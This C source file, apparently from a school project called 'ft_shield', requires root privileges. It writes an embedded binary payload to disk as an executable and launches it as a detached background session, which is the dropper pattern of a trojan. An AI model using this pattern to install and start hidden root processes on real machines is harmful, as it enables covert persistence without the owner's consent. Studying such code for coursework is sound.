#include "./inc/ft_shield.h"

static void	create_ft_shield(void)
{
	int fd = open(SHIELD_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (fd < 0)
		exit (EXIT_FAILURE);
	ssize_t bytes_out = write(fd, __daemon_shield_payload, __daemon_shield_payload_len);
	if (bytes_out < 0)
	{
		close(fd);
		exit (EXIT_FAILURE);
	}
	close(fd);
}

static void	launch_ft_shield(void)
{
	pid_t pid = fork();
	if (pid < 0)
		exit (EXIT_FAILURE);
	if (pid == 0)
	{
		setsid();
		execl(SHIELD_PATH, SHIELD_PATH, NULL);
		exit (EXIT_FAILURE);
	}
}

int	main()
{
	if (geteuid())
		exit (EXIT_FAILURE);
	create_ft_shield();
	launch_ft_shield();
	printf("ffarkas-edupless\n");
}
